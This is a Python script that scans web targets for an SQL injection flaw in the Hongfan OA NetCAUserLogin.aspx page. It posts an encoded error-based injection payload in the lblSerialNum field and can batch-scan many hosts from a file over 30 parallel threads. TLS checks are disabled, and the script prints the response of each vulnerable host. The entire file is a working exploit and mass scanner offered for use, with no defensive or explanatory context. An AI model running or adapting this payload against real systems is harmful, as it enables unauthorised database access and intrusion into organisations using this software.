import requests
import argparse
from multiprocessing.dummy import Pool
import urllib3


def main():
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    banner = """
             .__   
  ___________|  |  
 /  ___/ ____/  |  
 \___ < <_|  |  |__
/____  >__   |____/
     \/   |__|     
    """
    print(banner)
    parse = argparse.ArgumentParser(description="红帆OA NetCAUserLogin.aspx 存在SQL注入")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
    args = parse.parse_args()
    urls = []
    url = args.url
    file = args.file
    if url:
        if "http" not in url:
            url = f"http://{args.url}"
        check(url)
    elif file:
        with open(file, 'r+') as f:
            for i in f:
                domain = i.strip()
                if "http" not in domain:
                    urls.append(f"http://{domain}")
                else:
                    urls.append(domain)
        pool = Pool(30)
        pool.map(check, urls)


def check(domain):
    url = f"{domain}/ioffice/Identity/NetCAUserLogin.aspx"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0'
    }
    data = ("ioScriptManager1%24ScriptManager1=updatePanel1%7CbtVerify&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE"
            "=%2FwEPDwULLTEyMTUyMDIxNTRkZP07H79WIvd3R0It8GvgZeNLQtUV&__VIEWSTATEGENERATOR=65AD83CA&__SCROLLPOSITIONX"
            "=0&__SCROLLPOSITIONY=0&lblSerialNum=%27+AND+9176+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR"
            "%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289176%3D9176%29+THEN+CHAR%2849%29"
            "+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR"
            "%28113%29%29%29--+Vgmc&__ASYNCPOST=true&btVerify=")
    try:
        response = requests.post(url=url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 and "qpbbq1qpkvq" in response.text:
            print(f"[*]存在漏洞:{url}")
            print(response.text)
        else:
            print("[-]不存在漏洞")
    except Exception as e:
        print("网站出现错误")


if __name__ == '__main__':
    main()